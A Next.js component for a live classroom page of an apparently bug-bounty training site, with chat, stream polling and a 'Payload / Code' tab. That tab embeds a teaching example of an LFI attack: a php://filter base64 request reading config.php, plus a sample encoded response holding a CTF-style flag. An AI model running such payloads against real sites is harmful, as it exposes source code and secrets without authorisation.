'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';

export default function LiveClassroom() {
  const [activeTab, setActiveTab] = useState('chat');
  const [messages, setMessages] = useState([]);
  const [chatText, setChatText] = useState('');
  const [micOn, setMicOn] = useState(false);
  const [camOn, setCamOn] = useState(true);
  const [currentUser, setCurrentUser] = useState({ name: 'Tanvir Hossain', role: 'student', watermarkText: 'STD-1001 • Tanvir Hossain • 10.10.14.5' });
  const [liveStream, setLiveStream] = useState({ isSharing: false, broadcasterName: '' });

  useEffect(() => {
    const userStr = localStorage.getItem('arena_user');
    if (userStr) {
      try {
        const u = JSON.parse(userStr);
        setCurrentUser({
          ...u,
          watermarkText: `${u.id || 'USER'} • ${u.name} • ${u.batchId || 'BATCH'} • CONFIDENTIAL`
        });
      } catch (e) {}
    }

    fetchChatMessages();
    pollLiveStream();

    const interval = setInterval(() => {
      fetchChatMessages();
      pollLiveStream();
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  const fetchChatMessages = async () => {
    try {
      const res = await fetch('/api/chat/messages');
      const data = await res.json();
      if (data.success) setMessages(data.messages);
    } catch (e) {}
  };

  const pollLiveStream = async () => {
    try {
      const res = await fetch('/api/stream/live');
      const data = await res.json();
      if (data.success) setLiveStream(data.stream || { isSharing: false });
    } catch (e) {}
  };

  const handleSendChat = async (e) => {
    e.preventDefault();
    if (!chatText.trim()) return;

    const textToSend = chatText;
    setChatText('');

    const newMsg = {
      id: `MSG-${Date.now()}`,
      author: `${currentUser.name} (${(currentUser.role || 'student').toUpperCase()})`,
      role: currentUser.role || 'student',
      text: textToSend,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    // Optimistically show message immediately in UI
    setMessages(prev => [...prev, newMsg]);

    try {
      const token = localStorage.getItem('arena_token');
      await fetch('/api/chat/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ text: textToSend, authorName: currentUser.name })
      });
      fetchChatMessages();
    } catch (err) {}
  };

  return (
    <div style={{ background: '#030712', minHeight: '100vh', padding: '16px', display: 'flex', flexDirection: 'column' }}>
      
      {/* Top Header Bar */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '14px', background: '#090D16', padding: '12px 20px', borderRadius: '12px', border: '1px solid var(--bg-card-border)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div className="brand-logo" style={{ width: '34px', height: '34px', fontSize: '1.1rem' }}>🛡️</div>
          <div>
            <h2 style={{ fontSize: '1.05rem', fontWeight: 800 }}>Batch 1 — Web Security & Bug Bounty Live Session</h2>
            <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>Instructor: Rahat Chowdhury | Topic: LFI/RFI Exploitation</span>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <span className="badge badge-rose">🔴 LIVE ZOOM SDK CANVAS</span>
          <Link href="/student" className="btn btn-outline btn-sm">
            🚪 Exit Session
          </Link>
        </div>
      </div>

      {/* Main Classroom Layout */}
      <div className="classroom-container">
        
        {/* Main Video Canvas Area */}
        <div className="video-main-area">
          <div className="video-canvas">
            
            {/* Dynamic Security Watermark */}
            <div className="dynamic-watermark">
              {currentUser.watermarkText}
            </div>

            {/* Video Feed or Speaker Avatar Placeholder */}
            {liveStream.isSharing && liveStream.frame ? (
              <img src={liveStream.frame} alt="Teacher Screen Broadcast" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
            ) : (
              <div className="video-placeholder">
                <div className="avatar-large">RC</div>
                <h3 style={{ fontSize: '1.25rem', fontWeight: 700 }}>Rahat Chowdhury (Instructor)</h3>
                <p style={{ color: 'var(--text-muted)', fontSize: '0.85rem', marginTop: '4px' }}>
                  {liveStream.isSharing ? 'Sharing Screen & Demonstration...' : 'Microphone Active • Camera Standby'}
                </p>
              </div>
            )}

            {/* Active Speaker Info Overlay */}
            <div className="video-overlay-info">
              <span className="status-indicator live"></span>
              <span><strong>Rahat Chowdhury</strong> (Host)</span>
            </div>

          </div>

          {/* Bottom Toolbar Controls */}
          <div className="video-controls-bar">
            <div className="control-group">
              <button className={`ctrl-btn ${micOn ? 'active' : 'off'}`} onClick={() => setMicOn(!micOn)} title="Toggle Mic">
                {micOn ? '🎙️' : '🔇'}
              </button>
              <button className={`ctrl-btn ${camOn ? 'active' : 'off'}`} onClick={() => setCamOn(!camOn)} title="Toggle Camera">
                {camOn ? '📹' : '🚫'}
              </button>
            </div>

            <div className="control-group">
              <div className="timer-badge">
                ⏱️ 01:42:15
              </div>
            </div>

            <div className="control-group">
              <Link href="/student" className="end-class-btn">
                Leave Classroom
              </Link>
            </div>
          </div>
        </div>

        {/* Sidebar Tabs: Live Chat & Code Viewer */}
        <div className="classroom-sidebar">
          <div className="sidebar-tabs">
            <button className={`tab-btn ${activeTab === 'chat' ? 'active' : ''}`} onClick={() => setActiveTab('chat')}>
              💬 Live Chat ({messages.length})
            </button>
            <button className={`tab-btn ${activeTab === 'payload' ? 'active' : ''}`} onClick={() => setActiveTab('payload')}>
              💻 Payload / Code
            </button>
          </div>

          {/* Chat Tab Content */}
          <div className={`tab-content ${activeTab === 'chat' ? 'active' : ''}`}>
            <div className="chat-messages">
              {messages.map((m) => (
                <div className="chat-msg" key={m.id}>
                  <div className="author">
                    <span>{m.author}</span>
                    <span className="time">{m.time}</span>
                  </div>
                  <div style={{ color: 'var(--text-main)', marginTop: '2px' }}>{m.text}</div>
                </div>
              ))}
            </div>

            <form onSubmit={handleSendChat} className="chat-input-box">
              <input
                type="text"
                className="form-control"
                placeholder="Ask question or type message..."
                value={chatText}
                onChange={(e) => setChatText(e.target.value)}
                style={{ fontSize: '0.82rem' }}
              />
              <button type="submit" className="btn btn-primary btn-sm">
                Send
              </button>
            </form>
          </div>

          {/* Payload / Code Viewer Tab Content */}
          <div className={`tab-content ${activeTab === 'payload' ? 'active' : ''}`}>
            <h4 style={{ fontSize: '0.85rem', fontWeight: 700, marginBottom: '8px', color: 'var(--cyan)' }}>
              Live Payload Snippet from Instructor:
            </h4>
            <div className="code-viewer">
{`# PHP Base64 Filter Wrapper Exploit Payload
GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: 10.10.14.5
User-Agent: ArenaSecurityScanner/1.0
Accept: */*

# Response Base64 Output:
PD9waHAgJGZhbGc9IkFSRU5Be2xmaV9maWx0M3JfYnlwNHNzXzIwMjZ9Ijs/Pg==`}
            </div>
          </div>

        </div>

      </div>
    </div>
  );
}
